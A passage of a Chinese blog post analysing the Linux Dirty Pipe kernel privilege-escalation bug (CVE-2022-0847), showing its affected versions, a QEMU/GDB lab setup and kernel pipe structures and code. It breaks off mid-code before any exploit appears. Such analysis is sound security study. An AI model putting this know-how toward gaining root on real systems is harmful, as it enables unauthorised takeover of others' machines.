@@ -1,0 +1,914 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+
+
+<head>
+  <meta charset="utf-8" />
+   
+  <meta name="keywords" content="linux, dirty pipe, CVE-2022-0847,漏洞挖掘, 调试, 代码, 计算机科学, Kiprey, Blog, 二进制，信息安全" />
+   
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    Linux Dirty Pipe CVE-2022-0847 漏洞分析 |  Kiprey&#39;s Blog
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+  
+  
+
+  
+<script>
+var _hmt = _hmt || [];
+(function() {
+	var hm = document.createElement("script");
+	hm.src = "https://hm.baidu.com/hm.js?acff2772e1f74a625e1e26c280afa6c2";
+	var s = document.getElementsByTagName("script")[0]; 
+	s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<link rel="alternate" href="/atom.xml" title="Kiprey's Blog" type="application/atom+xml">
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-dirty-pipe"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  Linux Dirty Pipe CVE-2022-0847 漏洞分析
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2022/04/dirty-pipe/" class="article-date">
+  <time datetime="2022-04-02T16:00:00.000Z" itemprop="datePublished">2022-04-03</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/vulnerability-analysis/">vulnerability analysis</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">7.8k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">36 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="一、简介">一、简介</h2>
+<p>Dirty Pipe 漏洞是 Linux 系统中的一个内核提权漏洞，漏洞危害堪比 Dirty COW，但相对于 Dirty COW 来说更加容易利用。</p>
+<p>漏洞影响范围：<a href="f6dd975583bd8ce088400648fd9819e4691c8958">pipe: merge anon_pipe_buf*_ops - linux commit</a> （v5.8-rc1） ~ <a href="https://github.com/torvalds/linux/commit/9d2231c5d74e13b2a0546fee6737ee4446017903" target="_blank" rel="noopener">lib/iov_iter: initialize “flags” in new pipe_buffer</a>（v5.17-rc6）</p>
+<p>时间范围大概是 2020/5/21 - 2022/2/21。</p>
+<a id="more"></a>
+<h2 id="二、环境搭建">二、环境搭建</h2>
+<p>参照先前的 <a href="https://kiprey.github.io/2021/10/kernel_pwn_introduction/">Linux pwn 环境搭建笔记</a> 来搭建出一个带有漏洞的 linux 环境。这里使用的 commit id 为 f6dd975583bd8ce088400648fd9819e4691c8958。</p>
+<p>简单贴几个脚本：</p>
+<blockquote>
+<p>几个关键文件夹的位置关系：</p>
+<ul>
+<li><code>linux/busybox-1.34.1/_install</code>：busybox 文件系统位置</li>
+<li><code>linux/myfolder</code>：存放 exp 等需要复制进 VM 的文件</li>
+</ul>
+</blockquote>
+<p>启动 linux 脚本：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">! /bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 判断当前权限是否为 root，需要高权限以执行 gef-remote --qemu-mode</span></span><br><span class="line">user=$(env | grep "^USER" | cut -d "=" -f 2)</span><br><span class="line">if [ "$user" != "root"  ]</span><br><span class="line">  then</span><br><span class="line">    echo "请使用 root 权限执行"</span><br><span class="line">    exit</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 编译 POC</span></span><br><span class="line">g++ ./myfolder/poc.c -o ./myfolder/poc -static</span><br><span class="line"><span class="meta">#</span><span class="bash"> 复制文件至 rootfs</span></span><br><span class="line">cp ./myfolder/* busybox-1.34.1/_install</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 构建 rootfs</span></span><br><span class="line">pushd busybox-1.34.1/_install</span><br><span class="line">find . | cpio -o --format=newc &gt; ../../rootfs.img</span><br><span class="line">popd</span><br><span class="line"></span><br><span class="line">gnome-terminal -e 'gdb -x mygdbinit'</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动 qemu</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -kernel ./arch/x86/boot/bzImage \</span><br><span class="line">    -initrd ./rootfs.img \</span><br><span class="line">    -append "nokaslr" \</span><br><span class="line">    -m 2G \</span><br><span class="line">    -s  \</span><br><span class="line">    -S \</span><br><span class="line">    -nographic -append "console=ttyS0"</span><br></pre></td></tr></table></figure>
+<p>gdbinit：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">set architecture i386:x86-64</span><br><span class="line">add-symbol-file vmlinux</span><br><span class="line">gef-remote --qemu-mode localhost:1234</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> b start_kernel</span></span><br><span class="line">c</span><br></pre></td></tr></table></figure>
+<p>启动 qemu 时报了一个错：</p>
+<p><img src="/2022/04/dirty-pipe/image-20220401145316024.png" alt="image-20220401145316024"></p>
+<p>这是因为先前启动 qemu 时忘记指定内存 <code>-m</code> 了，加个 <code>-m 2G</code> 分配 2G 的内存给 qemu 即可。</p>
+<h2 id="三、代码浅析">三、代码浅析</h2>
+<p>在分析漏洞之前，我们需要熟悉一下该漏洞所涉及的代码片段，也算是顺便熟悉一下 pipe 机制的实现。</p>
+<p>这里将涉及 commit f6dd97 中的几个文件：</p>
+<ul>
+<li><code>include/linux/pipe_fs_i.h</code></li>
+<li><code>fs/pipe.c</code></li>
+<li><code>fs/splice.c</code></li>
+<li><code>lib/iov_iter.c</code></li>
+<li>…</li>
+</ul>
+<h3 id="1-pipe-相关结构体">1. pipe 相关结构体</h3>
+<h4 id="a-pipe-inode-info">a. pipe_inode_info</h4>
+<p><code>pipe_inode_info</code> 结构体存放了 pipe 机制所要用到的字段：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  struct pipe_inode_info - a linux kernel pipe</span></span><br><span class="line"><span class="comment"> *  @mutex: mutex protecting the whole thing</span></span><br><span class="line"><span class="comment"> *  @rd_wait: reader wait point in case of empty pipe</span></span><br><span class="line"><span class="comment"> *  @wr_wait: writer wait point in case of full pipe</span></span><br><span class="line"><span class="comment"> *  @head: The point of buffer production</span></span><br><span class="line"><span class="comment"> *  @tail: The point of buffer consumption</span></span><br><span class="line"><span class="comment"> *  @max_usage: The maximum number of slots that may be used in the ring</span></span><br><span class="line"><span class="comment"> *  @ring_size: total number of buffers (should be a power of 2)</span></span><br><span class="line"><span class="comment"> *  @tmp_page: cached released page</span></span><br><span class="line"><span class="comment"> *  @readers: number of current readers of this pipe</span></span><br><span class="line"><span class="comment"> *  @writers: number of current writers of this pipe</span></span><br><span class="line"><span class="comment"> *  @files: number of struct file referring this pipe (protected by -&gt;i_lock)</span></span><br><span class="line"><span class="comment"> *  @r_counter: reader counter</span></span><br><span class="line"><span class="comment"> *  @w_counter: writer counter</span></span><br><span class="line"><span class="comment"> *  @fasync_readers: reader side fasync</span></span><br><span class="line"><span class="comment"> *  @fasync_writers: writer side fasync</span></span><br><span class="line"><span class="comment"> *  @bufs: the circular array of pipe buffers</span></span><br><span class="line"><span class="comment"> *  @user: the user who created this pipe</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> head;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tail;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> max_usage;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> ring_size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> readers;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> writers;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> files;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> r_counter;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> w_counter;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>这个结构体麻雀虽小五脏俱全，该有的都有，包括等待写入/读取该管道的队列、管道大小、存放具体内存的指针数组等等。</p>
+<p>pipe 存放数据使用的是<strong>环形队列</strong>，即在定长大小的数据环（pipe buf ring）上，尽可能的存储数据；因此这里需要简单强调一下一些字段的用途：</p>
+<ul>
+<li>
+<p><code>head</code>：标注队列首部的索引，注意这里的索引单位是一个 <code>pipe_buffer</code>。<strong>head 为接下来要写入的位置</strong>。</p>
+</li>
+<li>
+<p><code>tail</code>：标注队列尾部的索引，<strong>tail 为接下来要读取的位置</strong>。</p>
+<p>上面两个字段的关系有点类似这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">low addr                                 high addr</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">|  |  |  |  |  |  |  | &gt;|&#x2F;&#x2F;|&#x2F;&#x2F;|&#x2F;&#x2F;|&gt; |  |  |  |</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">                       A   ----&gt;   A</span><br><span class="line">                       |           |</span><br><span class="line">                     tail         head</span><br></pre></td></tr></table></figure>
+<p>无论是 head 还是 tail，它们<strong>都指向没写满的 <code>pipe_buffer</code></strong>（有点类似 STL 的 end 方法）。</p>
+</li>
+<li>
+<p><code>max_usage</code>：最大可用的 pipe_buffer 个数，这个字段约束了整个 pipe 所能容纳的数据大小。</p>
+</li>
+<li>
+<p><code>ring_size</code>：当前已分配的 pipe_buffer 个数，<strong>注意该值必须为2的幂。</strong></p>
+</li>
+<li>
+<p><code>files</code>：结构体 file 引用至该管道的个数。这个有点类似某个管道被 dup 出多个 fd 一样。</p>
+</li>
+<li>
+<p><code>tmp_page</code>：缓存先前被释放的 page，这个 page 可以被重用以降低重分配开销。</p>
+</li>
+<li>
+<p><code>bufs</code>：实际存放多个 pipe_buffer 的数组，在设计上我们需要将该一维数组看作一个环。</p>
+</li>
+</ul>
+<h4 id="b-pipe-buffer">b. pipe_buffer</h4>
+<p>接下来我们简单深入一下结构体 <code>pipe_buffer</code>，该结构体存放着实际管道中存放的数据：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *  @page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *  @offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *  @len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *  @ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *  @flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *  @private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>这个结构体存放了包括页引用、页偏移、数据大小等关键信息。这里的 flag 共有这几种：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// include/linux/pipe_fs_i.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_BUF_FLAG_LRU       0x01    <span class="comment">/* page is on the LRU */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_BUF_FLAG_ATOMIC    0x02    <span class="comment">/* was atomically mapped */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_BUF_FLAG_GIFT      0x04    <span class="comment">/* page is a gift */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_BUF_FLAG_PACKET    0x08    <span class="comment">/* read() as a packet */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_BUF_FLAG_CAN_MERGE 0x10    <span class="comment">/* can merge buffers */</span></span></span><br></pre></td></tr></table></figure>
+<p>我们可以暂时不用去管这几种 flag 具体的意思。</p>
+<h4 id="c-iov-iter">c. iov_iter</h4>
+<p>结构体 iov_iter 用于<strong>迭代</strong>那种<strong>被分为多个页的数据</strong>，换句话说，该结构体将用于迭代一个个页面。其结构体如下所示：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> iter_type &#123;</span><br><span class="line">    <span class="comment">/* iter types */</span></span><br><span class="line">    ITER_IOVEC = <span class="number">4</span>,</span><br><span class="line">    ITER_KVEC = <span class="number">8</span>,</span><br><span class="line">    ITER_BVEC = <span class="number">16</span>,</span><br><span class="line">    ITER_PIPE = <span class="number">32</span>,    <span class="comment">// 表示正在迭代的数据是位于 pipe 中的</span></span><br><span class="line">    ITER_DISCARD = <span class="number">64</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iov_iter</span> &#123;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Bit 0 is the read/write bit, set if we're writing.</span></span><br><span class="line"><span class="comment">     * Bit 1 is the BVEC_FLAG_NO_REF bit, set if type is a bvec and</span></span><br><span class="line"><span class="comment">     * the caller isn't expecting to drop a page reference when done.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> type;</span><br><span class="line">    <span class="keyword">size_t</span> iov_offset;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> *<span class="title">iov</span>;</span></span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">kvec</span> *<span class="title">kvec</span>;</span></span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bio_vec</span> *<span class="title">bvec</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_segs;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> head;</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> start_head;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>其中，一些字段的意义如下：</p>
+<ul>
+<li>
+<p><code>type</code>：表示当前迭代的数据是来自于什么结构，例如：</p>
+<ul>
+<li>ITER_PIPE 表示当前迭代的数据为某个 pipe 中的页数据</li>
+<li>ITER_DISCARD 表示写入当前 iov_iter 的数据全部丢弃。</li>
+</ul>
+<p>后续针对 iov_iter 做内存读写时，会根据这个 type 来执行不同类型的内存读写操作。</p>
+</li>
+<li>
+<p><code>iov_offset</code>：当前所迭代到 page 的相对偏移，读写将从该 page 的这个相对偏移开始。</p>
+</li>
+<li>
+<p><code>cout</code>：可读写的数组字节大小</p>
+</li>
+</ul>
+<h3 id="2-pipe-read-函数">2. pipe_read 函数</h3>
+<p>pipe_read 函数位于 <code>fs/pipe.c</code> 中，当内核需要<strong>从某个管道中读取数据</strong>时便会调用该函数：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">pipefifo_fops</span> = &#123;</span></span><br><span class="line">    .open             = fifo_open,</span><br><span class="line">    .llseek           = no_llseek,</span><br><span class="line">    .read_iter        = pipe_read,     <span class="comment">// read</span></span><br><span class="line">    .write_iter       = pipe_write,    <span class="comment">// write</span></span><br><span class="line">    .poll             = pipe_poll,</span><br><span class="line">    .unlocked_ioctl   = pipe_ioctl,</span><br><span class="line">    .release          = pipe_release,</span><br><span class="line">    .fasync           = pipe_fasync,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>首先，该函数声明如下：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span><br><span class="line">pipe_read(struct kiocb *iocb, struct iov_iter *to)</span><br></pre></td></tr></table></figure>
+<p>这些结构体我们可以不用记住，只需简单知道：</p>
+<ul>
+<li><code>iocb</code>：中存放着获取当前 pipe 结构体的指针</li>
+<li><code>to</code>：从管道读出来的数据将要写入的地方，iov_iter 迭代器类型。</li>
+</ul>
+<p>接下来，内核从 <code>to</code> 中获取待读取的大小，并从 <code>iocb</code> 中获取 <code>pipe_inode_info</code> 结构体；如果待读取大小为 0 则直接返回：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> total_len = iov_iter_count(to);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> = <span class="title">iocb</span>-&gt;<span class="title">ki_filp</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> = <span class="title">filp</span>-&gt;<span class="title">private_data</span>;</span></span><br><span class="line"><span class="keyword">bool</span> was_full, wake_next_reader = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">ssize_t</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Null read succeeds. */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(total_len == <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line">__pipe_lock(pipe);</span><br></pre></td></tr></table></figure>
+<p>接下来，kernel 尝试判断 pipe 是否已满，如果满了则设置 <code>was_full</code> 标志：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">was_full &#x3D; pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage);</span><br></pre></td></tr></table></figure>
+<p>虽然这个标志对我们理解主要逻辑没有太大的影响，但这里提起它是为了看看 pipe 是如何判断是否已满的：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * pipe_occupancy - Return number of slots used in the pipe</span></span><br><span class="line"><span class="comment"> * @head: The pipe ring head pointer</span></span><br><span class="line"><span class="comment"> * @tail: The pipe ring tail pointer</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">pipe_occupancy</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> head, <span class="keyword">unsigned</span> <span class="keyword">int</span> tail)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> head - tail;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * pipe_full - Return true if the pipe is full</span></span><br><span class="line"><span class="comment"> * @head: The pipe ring head pointer</span></span><br><span class="line"><span class="comment"> * @tail: The pipe ring tail pointer</span></span><br><span class="line"><span class="comment"> * @limit: The maximum amount of slots available.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">pipe_full</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> head, <span class="keyword">unsigned</span> <span class="keyword">int</span> tail,</span></span></span><br><span class="line"><span class="function"><span class="params">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> limit)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> pipe_occupancy(head, tail) &gt;= limit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到，如果 <code>pipe-&gt;head - pipe-&gt;tail &gt;= pipe-&gt;max_usage</code>，则说明 pipe 数据区已满。相对的，判断 pipe 是否为空也很简单：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * pipe_empty - Return true if the pipe is empty</span></span><br><span class="line"><span class="comment"> * @head: The pipe ring head pointer</span></span><br><span class="line"><span class="comment"> * @tail: The pipe ring tail pointer</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">pipe_empty</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> head, <span class="keyword">unsigned</span> <span class="keyword">int</span> tail)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> head == tail;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>回到 <code>pipe_read</code> 函数，接下来 kernel 将循环读取 pipe：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 